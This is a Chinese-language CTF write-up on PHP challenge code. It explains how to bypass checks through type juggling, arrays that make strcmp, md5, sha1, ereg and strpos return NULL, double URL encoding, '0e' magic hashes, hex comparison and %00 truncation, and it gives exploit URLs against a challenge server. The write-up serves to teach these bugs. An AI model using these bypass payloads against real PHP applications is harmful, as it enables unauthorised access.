extract()可以覆盖变量值，因为`file_get_contents($flag)`，所以我们不能直接覆盖$flag一个值，那么可以利用php://input来获取POST数据流。在将shiyan的值覆盖与POST数据流相同即可。
```
http://120.24.86.145:9009/1.php?shiyan=1&flag=php://input
[POST DATA]
1
```

<br>

### strcmp比较字符串
```php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）
die('Flag: '.$flag);
else
print 'No';
}
```
在strcmp()函数中存在传入数组会返回Null，那么当我们传入数组，`Null==0`为true，那么满足条件。
`http://120.24.86.145:9009/6.php?a[]=1`
<br>

### urldecode二次编码绕过
```php
if(eregi("hackerDJ",$_GET[id])) {
  echo("not allowed!");
  exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "Access granted!";
  echo "flag";
}
```
代码中第一个条件限制了字符串经过一次URL编码后不能是hackerDJ，但是中间有进行了了urldecode()的操作，那么我们便有机可乘，只需要进行两次url编码即可。
请求`http://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`，服务器接受请求后会自动的进行一次URL解码，参数会变为`%68%61%63%6b%65%72%44%4a`，并且通过eregi()验证，
然后经过`urldecode()`函数在进行URL解码，`$_GET[id]==hackerDJ`，那么条件就成立，得到flag。
<br>

### md5()函数
```php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
  if ($_GET['username'] == $_GET['password'])
    print 'Your password can not be your username.';
  else if (md5($_GET['username']) === md5($_GET['password']))
    die('Flag: '.$flag);
  else
    print 'Invalid password';
}
```

```php
http://120.24.86.145:9009/18.php?username[]=3&password[]=1
服务器接受的参数实际是
var_dump($_GET['username']) //array(1) { [0]=> string(1) "3" }
var_dump($_GET['password']) //array(1) { [0]=> string(1) "1" }

数组之间比较，如果两者key对应的value都相同,那么两者相同，其他相反。
$_GET['username'] == $_GET['password'] //条件不满足

在利用md5()传入数组会返回Null的特性
md5($_GET['username']) === md5($_GET['password'])
Null === Null //满足

得到flag
```
<br>

### 数组返回NULL绕过
```php
$flag = "flag";

if (isset ($_GET['password'])) {
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
  echo 'You password must be alphanumeric';
else if (strpos ($_GET['password'], '--') !== FALSE)
  die('Flag: ' . $flag);
else
  echo 'Invalid password';
}
```
```php
http://120.24.86.145:9009/19.php?password[]=123
执行第一个IF, ereg()传入数组会返回为NULL，则
NULL === False // false

执行第二个IF, strpos()传入数组同样会返回为NULL，则
NULL !== False // true
得到flag
```
<br>

### sha()函数比较绕过
```php
$flag = "flag";
if (isset($_GET['name']) and isset($_GET['password']))
{
  var_dump($_GET['name']);
  echo "";
  var_dump($_GET['password']);
  var_dump(sha1($_GET['name']));
  var_dump(sha1($_GET['password']));
if ($_GET['name'] == $_GET['password'])
  echo 'Your password can not be your name!';
else if (sha1($_GET['name']) === sha1($_GET['password']))
  die('Flag: '.$flag);
else
  echo 'Invalid password.';
}
else
  echo 'Login first!';
```
```php
http://120.24.86.145:9009/7.php?name[]=21&password[]=2
执行第一个IF, 传入的两个数组内容不同，即
$_GET['name'] == $_GET['password'] // false
继续执行第二IF, 由于sha1()函数传入数组，会返回NULL，既
NULL === NULL // true
得到flag
```
<br>

### md5加密相等绕过
```php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
  if ($a != 'QNKCDZO' && $md51 == $md52) {
  echo "flag{*}";
  } else {
  echo "false!!!";
  }
}
else{
  echo "please input a";
}
```
```php
http://120.24.86.145:9009/13.php?a=s878926199a
传入参数和'QNKCDZO'被md5()函数加密后
$md51 = "0e830400451993494058024219903391"
$md52 = "0e545993274517709034328855841020"
当两者进行比较时，在php中，如果是 0e\d+ 开头的字符串，会被作为科学计数法来解析
0e830400451993494058024219903391 = 0*10^830400451993494058024219903391 = 0
同理，两者相等，得到flag

```
<br>
### 十六进制与数字比较
```php
error_reporting(0);
function noother_says_correct($temp)
{
  $flag = 'flag{test}';
  $one = ord('1'); //ord — 返回字符的 ASCII 码值
  $nine = ord('9'); //ord — 返回字符的 ASCII 码值
  $number = '3735929054';
  // Check all the input characters!
  for ($i = 0; $i < strlen($number); $i++)
  {
    // Disallow all the digits!
    $digit = ord($temp{$i});
    if ( ($digit >= $one) && ($digit <= $nine) )
    {
    // Aha, digit not allowed!
    return "flase";
    }
  }
  if($number == $temp)
    return $flag;
}

$temp = $_GET['password'];
echo noother_says_correct($temp);
```
```php
http://120.24.86.145:9009/20.php?password=0xdeadc0de
由于$temp中没有1-9的数字，既能通过循环验证
当两者进行比较时，由于$temp是16进制的格式，会被解析转换为10进制，在进行比较
($number == $temp) = ("3735929054" == "0xdeadc0de") = ("3735929054" == "3735929054") //true
得到flag
```
<br>

### ereg正则%00截断
```php
$flag = "xxx";
if (isset ($_GET['password']))
{
  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
  {
    echo 'You password must be alphanumeric';
  }
  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
  {
    if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置，找到返回字符位置，没有找到返回false
    {
      die('Flag: ' . $flag);
    }
    else
    {
      echo('- have not been found');
    }
  }
  else
  {
    echo 'Invalid password';
  }
}
```
这题有个坑，给出的源码和实际的不符合，strpos的实际是`*-*`而不是`-`...
```php
http://120.24.86.145:9009/5.php?password=9e9%00*-*
通过ereg()时，%00会截断，导致只会验证%00之前的字符串
strlen($_GET['password']) < 8  传入长度实际为7个字符，%00在服务端经过url解码后算一个字符 // true
$_GET['password'] > 9999999  由于开头0e\d+会根据科学计数法转换为数字
9e9%00*-* = 9*10^9 > 9999999     (在和数字比较时,在9e9后面的字符串会被忽略，不列入计算中)
最后经过strpos()时，字符串中出现了*-*字符串，则返回字符所在开始位置，则返回4, (4 !== false) //true
得到flag
```
这边还有一个解法
```php
http://120.24.86.145:9009/5.php?password[]=1
ereg()传入数组会返回NULL，而NULL===FALSE //false
strlen()传入数组会返回NULL, NULL < 8 //true
$_GET['password'] > 9999999 ，数组与数字进行比较时，都会比数字大
strpos()传入数组会返回NULL， NULL!==FLASE // true
得到flag
```
<br>

### strpos数组绕过
```php
$flag = "flag";
if (isset ($_GET['ctf'])) {
  if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
    echo '必须输入数字才行';
  else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
    die('Flag: '.$flag);
  else
    echo '骚年，继续努力吧啊~';
}
```
```php
http://120.24.86.145:9009/15.php?ctf[]=1
ereg()传入数组，返回NULL， NULL === FALSE //false
strpos传入数组，返回NULL， NULL!== FALSE // true
得到flag
```
<br>

## Web进阶
待做...
### Web2

<br>
